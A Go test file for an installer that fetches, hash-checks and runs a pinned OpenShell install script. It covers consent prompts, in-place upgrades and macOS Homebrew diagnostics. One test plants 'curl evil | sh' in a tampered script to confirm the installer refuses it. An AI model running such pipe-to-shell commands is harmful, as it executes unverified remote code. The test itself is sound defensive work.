// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package openshell_test

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/openshell"
	"github.com/defenseclaw/defenseclaw/internal/openshell/openshelltest"
)

const fakeScript = "#!/bin/sh\necho installing openshell\n"

type installFixture struct {
	t        *testing.T
	srv      *httptest.Server
	hits     atomic.Int32
	runner   *openshelltest.Runner
	cliPath  string
	tempDir  string
	out      bytes.Buffer
	verified int
	inst     *openshell.Installer
	// scriptSeen is the script content and mode observed while the
	// installer ran.
	scriptSeen []byte
	scriptMode os.FileMode
}

func sha(b string) string {
	sum := sha256.Sum256([]byte(b))
	return hex.EncodeToString(sum[:])
}

// newInstallFixture serves body as the installer and scripts a machine on
// which the CLI reports existing (empty: not installed) before the
// install and after (empty: still not installed) once the script ran.
func newInstallFixture(t *testing.T, body, existing, after string) *installFixture {
	t.Helper()
	skipOnWindows(t)
	f := &installFixture{t: t, runner: &openshelltest.Runner{}}
	f.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.hits.Add(1)
		if r.URL.Path != "/NVIDIA/OpenShell/v0.1.1/install.sh" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(f.srv.Close)
	f.cliPath = filepath.Join(t.TempDir(), "openshell")
	f.tempDir = t.TempDir()
	version := existing
	if existing != "" {
		writeExecutable(t, f.cliPath)
	}
	f.runner.OnFunc(f.cliPath+" --version", func(context.Context, openshell.Command) ([]byte, error) {
		return []byte(version + "\n"), nil
	})
	f.runner.OnFunc("/bin/sh", func(_ context.Context, c openshell.Command) ([]byte, error) {
		path := c.Args[0]
		data, err := os.ReadFile(path)
		if err != nil {
			t.Errorf("script missing while the installer runs: %v", err)
		}
		info, _ := os.Stat(path)
		f.scriptSeen, f.scriptMode = data, info.Mode().Perm()
		if after != "" {
			writeExecutable(t, f.cliPath)
			version = after
		}
		return nil, nil
	})
	f.inst = &openshell.Installer{
		HTTPClient: f.srv.Client(),
		URL:        f.srv.URL + "/NVIDIA/OpenShell/v0.1.1/install.sh",
		SHA256:     sha(body),
		Release:    "v0.1.1",
		TempDir:    f.tempDir,
		Runner:     f.runner,
		LookPath:   func(string) (string, error) { return "", errors.New("not on PATH") },
		Candidates: []string{f.cliPath},
		PackageCLI: f.cliPath,
		GOOS:       "linux",
		Out:        &f.out,
		Consent: func(p *openshell.InstallPlan) (bool, error) {
			if !strings.Contains(f.out.String(), p.SHA256) {
				t.Errorf("plan was not printed before consent:\n%s", f.out.String())
			}
			return true, nil
		},
		VerifyGateway: func(context.Context) error { f.verified++; return nil },
	}
	return f
}

func writeExecutable(t *testing.T, path string) {
	t.Helper()
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
}

func (f *installFixture) ran() bool { return f.runner.Called("/bin/sh") }

// scriptRun returns the installer command, run through /bin/sh.
func (f *installFixture) scriptRun() openshell.Command {
	for _, c := range f.runner.Calls() {
		if c.Name == "/bin/sh" {
			return c
		}
	}
	f.t.Fatal("the installer did not run")
	return openshell.Command{}
}

func (f *installFixture) assertNoLeftovers() {
	f.t.Helper()
	if entries, err := os.ReadDir(f.tempDir); err != nil || len(entries) != 0 {
		f.t.Fatalf("installer left files behind in %s: %v, %v", f.tempDir, entries, err)
	}
}

func TestInstallFresh(t *testing.T) {
	// Inherited variables the pinned script reads: the release, the
	// method, the CLI it registers the gateway with, a test switch that
	// makes it a no-op.
	inherited := []string{"OPENSHELL_VERSION", "OPENSHELL_ACK_BREAKING_UPGRADE", "OPENSHELL_INSTALL_METHOD", "OPENSHELL_REGISTER_BIN",
		"OPENSHELL_INSTALL_SH_TEST", "OPENSHELL_TEST_LDD_OUTPUT", "OPENSHELL_SNAP_TLS_DIR"}
	for _, v := range inherited {
		t.Setenv(v, "inherited")
	}
	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
	res, err := f.inst.Install(context.Background())
	if err != nil || !res.Installed || res.CLIVersion.String() != "0.1.1" || f.verified != 1 {
		t.Fatalf("Install = %+v, %v (gateway verified %d times)", res, err, f.verified)
	}
	if string(f.scriptSeen) != fakeScript || f.scriptMode != 0o600 {
		t.Fatalf("script run = %q mode %04o, want the verified bytes 0600", f.scriptSeen, f.scriptMode)
	}
	run := f.scriptRun()
	if !slices.Equal(run.Env, []string{"OPENSHELL_VERSION=v0.1.1", "OPENSHELL_REGISTER_BIN=" + f.cliPath}) {
		t.Fatalf("installer env = %v", run.Env)
	}
	for _, v := range inherited {
		if !slices.Contains(run.Unset, v) {
			t.Errorf("inherited %s is not dropped: %v", v, run.Unset)
		}
	}
	plan := f.out.String()
	for _, want := range []string{"v0.1.1", f.inst.URL, sha(fakeScript), "OPENSHELL_VERSION=v0.1.1 OPENSHELL_REGISTER_BIN=" + f.cliPath + " /bin/sh "} {
		if !strings.Contains(plan, want) {
			t.Errorf("plan lacks %q:\n%s", want, plan)
		}
	}
	if strings.Contains(plan, "ACK_BREAKING") {
		t.Errorf("fresh install plan acknowledges a breaking upgrade:\n%s", plan)
	}
	f.assertNoLeftovers()
}

func TestInstallRefusesDigestMismatch(t *testing.T) {
	f := newInstallFixture(t, fakeScript+"curl evil | sh\n", "", "openshell 0.1.1")
	f.inst.SHA256 = sha(fakeScript)
	consented := false
	f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { consented = true; return true, nil }
	_, err := f.inst.Install(context.Background())
	var mismatch *openshell.DigestMismatchError
	if !errors.Is(err, openshell.ErrDigestMismatch) || !errors.As(err, &mismatch) || mismatch.Got != sha(fakeScript+"curl evil | sh\n") {
		t.Fatalf("Install = %v (%+v), want ErrDigestMismatch", err, mismatch)
	}
	if consented || f.ran() || f.out.Len() != 0 {
		t.Fatalf("a mismatched script reached consent=%v run=%v plan=%q", consented, f.ran(), f.out.String())
	}
	f.assertNoLeftovers()
}

// TestInstallRefusals covers installs that stop before the script runs.
func TestInstallRefusals(t *testing.T) {
	for _, tc := range []struct {
		name    string
		mutate  func(f *installFixture)
		wantIs  error
		wantErr string
	}{
		{"http url", func(f *installFixture) { f.inst.URL = strings.Replace(f.inst.URL, "https://", "http://", 1) }, nil, "must be https"},
		{"not found", func(f *installFixture) { f.inst.URL = f.srv.URL + "/missing.sh" }, nil, "HTTP 404"},
		{"too large", func(f *installFixture) { f.inst.MaxScriptBytes = 8 }, nil, "exceeds 8 bytes"},
		{"declined", func(f *installFixture) {
			f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
		}, openshell.ErrInstallDeclined, ""},
		// Without a consent callback nothing is even downloaded.
		{"no consent callback", func(f *installFixture) { f.inst.Consent = nil }, nil, ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
			tc.mutate(f)
			_, err := f.inst.Install(context.Background())
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) || (tc.wantIs != nil && !errors.Is(err, tc.wantIs)) {
				t.Fatalf("Install = %v, want %q (%v)", err, tc.wantErr, tc.wantIs)
			}
			if f.ran() || (f.inst.Consent == nil && f.hits.Load() != 0) {
				t.Fatalf("installer ran %v after %d downloads", f.ran(), f.hits.Load())
			}
			f.assertNoLeftovers()
		})
	}
}

func TestInstallExistingReleases(t *testing.T) {
	for _, tc := range []struct {
		name, existing string
		installed      bool
		unsupported    bool
		downloads      int32
	}{
		{name: "supported is kept", existing: "openshell 0.1.3"},
		{name: "newer minor refused", existing: "openshell 0.2.0", unsupported: true},
		{name: "0.1.0 upgraded in place", existing: "openshell 0.1.0", installed: true, downloads: 1},
		// As doctor advises: 0.0.37 and later need no cleanup.
		{name: "0.0.40 upgraded in place", existing: "openshell 0.0.40", installed: true, downloads: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, tc.existing, "openshell 0.1.1")
			res, err := f.inst.Install(context.Background())
			var u *openshell.ErrUnsupportedVersion
			if tc.unsupported != errors.As(err, &u) || (!tc.unsupported && (err != nil || res.Installed != tc.installed)) {
				t.Fatalf("Install = %+v, %v", res, err)
			}
			if got := f.hits.Load(); got != tc.downloads {
				t.Fatalf("downloads = %d, want %d", got, tc.downloads)
			}
			if tc.installed && !strings.Contains(f.out.String(), "upgrades the installed "+tc.existing+" to v0.1.1 in place") {
				t.Fatalf("plan lacks the in-place note:\n%s", f.out.String())
			}
			if strings.Contains(f.out.String(), "ACK_BREAKING") {
				t.Fatalf("an in-place upgrade acknowledges a breaking one:\n%s", f.out.String())
			}
		})
	}
}

// TestInstallUpgradesInPlace: Install keeps a supported CLI, and Upgrade
// runs the pinned installer over one older than the release, after the
// flush of the sandboxes the script's gateway restart stops. It never
// downgrades, refuses a CLI the package would not replace, and fails when
// the old CLI still answers afterwards.
func TestInstallUpgradesInPlace(t *testing.T) {
	setup := func(t *testing.T, existing, after string) (*installFixture, *int) {
		f := newInstallFixture(t, fakeScript, existing, after)
		f.inst.Release = openshell.InstallerTag
		flushed := new(int)
		f.inst.FlushSandboxes = func(context.Context) error {
			if f.ran() {
				t.Error("the sandboxes were flushed after the script ran")
			}
			*flushed++
			return nil
		}
		return f, flushed
	}
	t.Run("upgraded", func(t *testing.T) {
		f, flushed := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
		res, err := f.inst.Upgrade(context.Background())
		if err != nil || !res.Installed || res.CLIVersion.String() != openshell.InstallerVersion || *flushed != 1 || f.verified != 1 {
			t.Fatalf("Upgrade = %+v, %v (flushed %d, gateway verified %d)", res, err, *flushed, f.verified)
		}
		if env := f.scriptRun().Env; !slices.Equal(env, []string{"OPENSHELL_VERSION=" + openshell.InstallerTag, "OPENSHELL_REGISTER_BIN=" + f.cliPath}) {
			t.Fatalf("installer env = %v", env)
		}
		for _, want := range []string{"upgrades the installed openshell 0.1.1 to " + openshell.InstallerTag + " in place",
			"the script restarts the OpenShell gateway, which stops every sandbox running on it"} {
			if !strings.Contains(f.out.String(), want) {
				t.Errorf("plan lacks %q:\n%s", want, f.out.String())
			}
		}
		f.assertNoLeftovers()
	})
	t.Run("Install keeps it", func(t *testing.T) {
		f, flushed := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
		if res, err := f.inst.Install(context.Background()); err != nil || res.Installed || f.hits.Load() != 0 || f.ran() || *flushed != 0 {
			t.Fatalf("Install = %+v, %v (downloads %d, flushed %d)", res, err, f.hits.Load(), *flushed)
		}
	})
	for _, existing := range []string{"openshell " + openshell.InstallerVersion, "openshell 0.1.9"} {
		t.Run("never downgrades "+existing, func(t *testing.T) {
			f, flushed := setup(t, existing, "openshell 0.1.1")
			if res, err := f.inst.Upgrade(context.Background()); err != nil || res.Installed || f.hits.Load() != 0 || f.ran() || *flushed != 0 {
				t.Fatalf("Upgrade = %+v, %v (downloads %d, flushed %d)", res, err, f.hits.Load(), *flushed)
			}
		})
	}
	t.Run("a sandbox that cannot be flushed", func(t *testing.T) {
		f, _ := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
		f.inst.FlushSandboxes = func(context.Context) error { return openshell.ErrUnflushed }
		if _, err := f.inst.Upgrade(context.Background()); !errors.Is(err, openshell.ErrUnflushed) || f.ran() {
			t.Fatalf("Upgrade = %v (ran %v)", err, f.ran())
		}
		f.assertNoLeftovers()
	})
	t.Run("installed another way", func(t *testing.T) {
		f, flushed := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
		f.inst.PackageCLI = filepath.Join(t.TempDir(), "openshell")
		if _, err := f.inst.Upgrade(context.Background()); !errors.Is(err, openshell.ErrUnmanagedUpgrade) || !strings.Contains(err.Error(), "the way you installed it") ||
			f.hits.Load() != 0 || f.ran() || *flushed != 0 {
			t.Fatalf("Upgrade = %v (downloads %d, flushed %d)", err, f.hits.Load(), *flushed)
		}
	})
	t.Run("the old CLI still answers", func(t *testing.T) {
		f, _ := setup(t, "openshell 0.1.1", "")
		if _, err := f.inst.Upgrade(context.Background()); err == nil || !strings.Contains(err.Error(), `still reports "openshell 0.1.1", not `+openshell.InstallerVersion) {
			t.Fatalf("Upgrade = %v", err)
		}
	})
}

func TestInstallBreakingUpgrade(t *testing.T) {
	for _, existing := range []string{"openshell 0.0.16", "openshell (build 1f2e)"} {
		t.Run(existing, func(t *testing.T) {
			// No confirmation callback: refused, with the cleanup explained.
			f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() ||
				!strings.Contains(f.out.String(), "openshell sandbox delete --all && openshell gateway destroy") {
				t.Fatalf("Install = %v (ran %v), plan:\n%s", err, f.ran(), f.out.String())
			}
			f.assertNoLeftovers()

			f = newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
			f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return false, nil }
			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
				t.Fatalf("declined: Install = %v (ran %v)", err, f.ran())
			}

			f = newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
			var confirmed *openshell.InstallPlan
			f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { confirmed = p; return true, nil }
			if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || confirmed == nil || !confirmed.BreakingUpgrade {
				t.Fatalf("confirmed: Install = %+v, %v (plan %+v)", res, err, confirmed)
			}
			if env := f.scriptRun().Env; !slices.Contains(env, "OPENSHELL_ACK_BREAKING_UPGRADE=1") {
				t.Fatalf("installer env = %v", env)
			}
		})
	}
}

// TestInstallReplacesLegacyCLI covers a pre-0.0.37 CLI in ~/.local/bin,
// which comes before the package's CLI on PATH and which the package does
// not replace: the plan says to remove it, the script registers the
// gateway with the package's CLI, and an install that leaves the old CLI
// first on PATH is reported, not passed.
func TestInstallReplacesLegacyCLI(t *testing.T) {
	setup := func(t *testing.T) (*installFixture, string) {
		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
		legacy := filepath.Join(t.TempDir(), "openshell")
		writeExecutable(t, legacy)
		f.runner.On(legacy+" --version", "openshell 0.0.36\n", nil)
		f.inst.LookPath = func(string) (string, error) {
			if _, err := os.Stat(legacy); err != nil {
				return "", err
			}
			return legacy, nil
		}
		f.inst.Candidates = []string{legacy, f.cliPath}
		f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { return true, nil }
		return f, legacy
	}
	t.Run("left in place", func(t *testing.T) {
		f, legacy := setup(t)
		_, err := f.inst.Install(context.Background())
		if !errors.Is(err, openshell.ErrStaleCLI) || !strings.Contains(err.Error(), "rm "+legacy) || !strings.Contains(err.Error(), "installed at "+f.cliPath) {
			t.Fatalf("Install = %v", err)
		}
		if !strings.Contains(f.out.String(), "then remove the old CLI") || !strings.Contains(f.out.String(), "    rm "+legacy) {
			t.Fatalf("plan does not say to remove the old CLI:\n%s", f.out.String())
		}
		if env := f.scriptRun().Env; !slices.Contains(env, "OPENSHELL_REGISTER_BIN="+f.cliPath) {
			t.Fatalf("installer registers the gateway with PATH's CLI: env %v", env)
		}
	})
	t.Run("removed as the plan says", func(t *testing.T) {
		f, legacy := setup(t)
		f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return true, os.Remove(legacy) }
		if res, err := f.inst.Install(context.Background()); err != nil || res.CLIVersion.String() != "0.1.1" {
			t.Fatalf("Install = %+v, %v", res, err)
		}
	})
}

// TestInstallNeverRunsRelativeCandidates covers a fresh install (no CLI on
// PATH) from a directory holding .local/bin/openshell: with HOME unset or
// relative the default home candidate would name that file, and the
// installer would run it as the existing CLI.
func TestInstallNeverRunsRelativeCandidates(t *testing.T) {
	for _, tc := range []struct {
		name, home string
		candidates []string
	}{
		{name: "HOME unset", home: ""},
		{name: "HOME relative", home: "relhome"},
		{name: "relative candidate", home: "/nonexistent-home", candidates: []string{filepath.Join(".local", "bin", "openshell")}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
			work := t.TempDir()
			for _, dir := range []string{work, filepath.Join(work, "relhome")} {
				if err := os.MkdirAll(filepath.Join(dir, ".local", "bin"), 0o755); err != nil {
					t.Fatal(err)
				}
				writeExecutable(t, filepath.Join(dir, ".local", "bin", "openshell"))
			}
			t.Chdir(work)
			t.Setenv("HOME", tc.home)
			f.inst.Candidates = tc.candidates
			f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
			_, _ = f.inst.Install(context.Background())
			for _, c := range f.runner.Calls() {
				if !filepath.IsAbs(c.Name) {
					t.Fatalf("installer ran %q, a path relative to the working directory", c.Name)
				}
			}
		})
	}
	t.Run("absolute HOME still probed", func(t *testing.T) {
		f := newInstallFixture(t, fakeScript, "", "")
		home := t.TempDir()
		cli := filepath.Join(home, ".local", "bin", "openshell")
		if err := os.MkdirAll(filepath.Dir(cli), 0o755); err != nil {
			t.Fatal(err)
		}
		writeExecutable(t, cli)
		f.runner.On(cli+" --version", "openshell 0.1.1\n", nil)
		t.Setenv("HOME", home)
		f.inst.Candidates = nil
		if res, err := f.inst.Install(context.Background()); err != nil || res.Installed || res.Plan.Existing == nil || res.Plan.Existing.Path != cli {
			t.Fatalf("Install = %+v, %v; want the CLI in the home directory found", res, err)
		}
	})
}

func TestInstallVerifiesOutcome(t *testing.T) {
	for _, tc := range []struct {
		name, after string
		mutate      func(f *installFixture)
		wantErr     string
	}{
		{"cli still old", "openshell 0.0.40", nil, "0.0.40"},
		{"no cli after install", "", nil, "no openshell CLI"},
		{"gateway unhealthy", "openshell 0.1.1", func(f *installFixture) {
			f.inst.VerifyGateway = func(context.Context) error { return errors.New("connection refused") }
		}, "gateway is not healthy"},
		{"installer fails", "openshell 0.1.1", func(f *installFixture) { f.runner.On("/bin/sh", "", errors.New("exit status 1")) }, "installer failed"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", tc.after)
			if tc.mutate != nil {
				tc.mutate(f)
			}
			if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("Install = %v, want %q", err, tc.wantErr)
			}
			f.assertNoLeftovers()
		})
	}
}

// TestInstallFailureOnMacOSNamesHomebrew: on macOS the script installs the
// nvidia/openshell Homebrew formula, which Homebrew refuses to build with
// an Xcode older than it wants; the failure says Homebrew failed, where it
// used to say only "installer failed: /bin/sh: exit status 1" (manual test
// M6).
func TestInstallFailureOnMacOSNamesHomebrew(t *testing.T) {
	for goos, homebrew := range map[string]bool{"darwin": true, "linux": false} {
		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
		f.inst.GOOS = goos
		f.runner.On("/bin/sh", "", errors.New("exit status 1"))
		_, err := f.inst.Install(context.Background())
		if err == nil || errors.Is(err, openshell.ErrHomebrewInstall) != homebrew || !strings.Contains(err.Error(), "exit status 1") {
			t.Fatalf("%s: Install = %v", goos, err)
		}
	}
}

// xcodeApp makes an Xcode.app of version (none when empty) and returns its
// path.
func xcodeApp(t *testing.T, version string) string {
	t.Helper()
	app := filepath.Join(t.TempDir(), "Xcode.app")
	if err := os.MkdirAll(filepath.Join(app, "Contents"), 0o755); err != nil {
		t.Fatal(err)
	}
	if version != "" {
		plist := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\">\n<dict>\n\t<key>BuildVersion</key>\n\t<string>2</string>\n" +
			"\t<key>CFBundleShortVersionString</key>\n\t<string>" + version + "</string>\n\t<key>CFBundleVersion</key>\n\t<string>24553</string>\n</dict>\n</plist>\n"
		if err := os.WriteFile(filepath.Join(app, "Contents", "version.plist"), []byte(plist), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return app
}

// TestHomebrewFailureReportsTheDeveloperTools: Homebrew refused NVIDIA's
// formula on a Mac with "Your Xcode (26.2) at /Applications/Xcode.app is too
// outdated. Please update to Xcode 27.0 (or delete it).", while
// xcode-select selected the Command Line Tools 27.0, which were current.
// The failure carries what Homebrew checked, from sw_vers, xcode-select,
// pkgutil and Xcode.app's version.plist, so setup can say that the fix is
// that Xcode.app, not the Command Line Tools.
func TestHomebrewFailureReportsTheDeveloperTools(t *testing.T) {
	const clt = "/Library/Developer/CommandLineTools"
	for _, tc := range []struct {
		name, selected, cltVersion, xcode string
		noXcode, outdated                 bool
	}{
		{name: "current tools, old Xcode.app", selected: clt, cltVersion: "27.0.0.0.1.1788430756", xcode: "26.2", outdated: true},
		{name: "Xcode.app current", selected: clt, cltVersion: "27.0.0.0.1.1788430756", xcode: "27.0"},
		{name: "tools old too", selected: clt, cltVersion: "26.2.0.0.1.1764812424", xcode: "26.2"},
		{name: "Xcode.app selected", selected: "/Applications/Xcode.app/Contents/Developer", cltVersion: "27.0.0.0.1.1788430756", xcode: "26.2"},
		{name: "no Xcode.app", selected: clt, cltVersion: "27.0.0.0.1.1788430756", noXcode: true},
		{name: "Xcode.app version unknown", selected: clt, cltVersion: "27.0.0.0.1.1788430756"},
		{name: "no tools", xcode: "26.2"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
			f.inst.GOOS = "darwin"
			f.inst.XcodeApp = xcodeApp(t, tc.xcode)
			if tc.noXcode {
				f.inst.XcodeApp = filepath.Join(t.TempDir(), "Xcode.app")
			}
			f.runner.On("/bin/sh", "", errors.New("exit status 1"))
			f.runner.On("sw_vers -productVersion", "27.0\n", nil)
			if tc.selected != "" {
				f.runner.On("xcode-select -p", tc.selected+"\n", nil)
			} else {
				f.runner.On("xcode-select -p", "xcode-select: error: unable to get active developer directory\n", errors.New("exit status 2"))
			}
			if tc.cltVersion != "" {
				f.runner.On("pkgutil --pkg-info=com.apple.pkg.CLTools_Executables",
					"package-id: com.apple.pkg.CLTools_Executables\nversion: "+tc.cltVersion+"\nvolume: /\nlocation: /\ninstall-time: 1790090818\n", nil)
			}
			_, err := f.inst.Install(context.Background())
			var hb *openshell.HomebrewInstallError
			if !errors.Is(err, openshell.ErrHomebrewInstall) || !errors.As(err, &hb) || hb.Tools == nil ||
				err.Error() != "openshell: Homebrew could not install the nvidia/openshell formula (exit status 1)" {
				t.Fatalf("Install = %v", err)
			}
			d := hb.Tools
			if d.MacOS != "27.0" || d.Selected != tc.selected || d.CLT != tc.cltVersion || d.Xcode != tc.xcode || (d.XcodeApp == "") != tc.noXcode {
				t.Fatalf("developer tools = %+v", d)
			}
			if d.OutdatedXcodeApp() != tc.outdated {
				t.Fatalf("OutdatedXcodeApp = %t for %+v", !tc.outdated, d)
			}
			for _, c := range f.runner.Calls() {
				if c.Name == "brew" || (c.Name == "xcode-select" && len(c.Args) != 1) {
					t.Fatalf("ran %v", c)
				}
			}
		})
	}
	if v := openshell.ShortVersion("27.0.0.0.1.1788430756"); v != "27.0" {
		t.Fatalf("ShortVersion = %q", v)
	}
}

// TestInstallPlanOnMacOSSaysWhatItChanges: on a Mac NVIDIA's script
// updated Homebrew itself (Homebrew's auto-update: 7.0.7-12 to 7.0.7-38,
// with homebrew/core and homebrew/cask), wrote the release's openshell.rb
// over the tap's Formula/openshell.rb, and registered the "openshell"
// gateway in ~/.config/openshell, none of which the plan said. It says so
// now, and that no sudo is used.
func TestInstallPlanOnMacOSSaysWhatItChanges(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", "")
	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
	f.inst.GOOS = "darwin"
	res, err := f.inst.Install(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	plan := f.out.String()
	for _, want := range []string{
		"  Privileges  none: the script runs Homebrew as you, without sudo\n",
		"  Changes     Homebrew may update itself and its taps first (its auto-update, when due; HOMEBREW_NO_AUTO_UPDATE=1 skips it)\n",
		"              the release's openshell.rb replaces Formula/openshell.rb in the nvidia/openshell tap (created if missing)\n",
		"              the script installs the nvidia/openshell/openshell formula and starts the gateway with brew services\n",
		"              it registers that gateway as \"openshell\" in ~/.config/openshell, replacing a registration of that name\n",
	} {
		if !strings.Contains(plan, want) {
			t.Errorf("plan lacks %q:\n%s", want, plan)
		}
	}
	if res.Plan.ConfigDir != filepath.Join("~", ".config", "openshell") {
		t.Fatalf("plan config dir = %q", res.Plan.ConfigDir)
	}
	// Linux's plan is the package's.
	f = newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
	if _, err := f.inst.Install(context.Background()); err != nil {
		t.Fatal(err)
	}
	if plan := f.out.String(); strings.Contains(plan, "Homebrew") || !strings.Contains(plan, "the script uses sudo to install the openshell package") {
		t.Fatalf("linux plan:\n%s", plan)
	}
}

// TestInstallerPreparesTheMicroVMDriver: on a Mac the MicroVM driver needs
// e2fsprogs and a Hypervisor signature, which the installer gets from
// Homebrew once the user agreed; a failure says what Homebrew said.
func TestInstallerPreparesTheMicroVMDriver(t *testing.T) {
	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
	f.runner.On("brew install e2fsprogs", "", nil)
	f.runner.On("brew postinstall nvidia/openshell/openshell", "Error: nvidia/openshell/openshell is not installed", errors.New("exit status 1"))
	if err := f.inst.InstallE2fsprogs(context.Background()); err != nil || !f.runner.Called("brew install e2fsprogs") {
		t.Fatalf("InstallE2fsprogs = %v; calls %v", err, f.runner.Calls())
	}
	err := f.inst.ResignVMDriver(context.Background())
	if err == nil || !strings.Contains(err.Error(), "brew postinstall nvidia/openshell/openshell: exit status 1: Error: nvidia/openshell/openshell is not installed") {
		t.Fatalf("ResignVMDriver = %v", err)
	}
	// The macOS install plan says the driver needs e2fsprogs too, which
	// setup offers next, only when it is missing: it said so on a Mac
	// whose e2fsprogs was installed, where setup offers nothing.
	keg := filepath.Join(t.TempDir(), "opt", "e2fsprogs", "sbin")
	const note = "a Mac runs sandboxes in OpenShell MicroVMs, whose driver also needs e2fsprogs, which the formula does not install " +
		"(brew install e2fsprogs; setup offers it next)"
	for _, installed := range []bool{false, true} {
		if installed {
			for _, tool := range []string{"mke2fs", "debugfs"} {
				if err := os.MkdirAll(keg, 0o755); err != nil {
					t.Fatal(err)
				}
				writeExecutable(t, filepath.Join(keg, tool))
			}
		}
		f = newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
		f.inst.GOOS, f.inst.E2fsprogsDirs = "darwin", []string{keg}
		if _, err := f.inst.Install(context.Background()); err != nil {
			t.Fatal(err)
		}
		if strings.Contains(f.out.String(), note) == installed {
			t.Fatalf("e2fsprogs installed %t, plan:\n%s", installed, f.out.String())
		}
	}
}
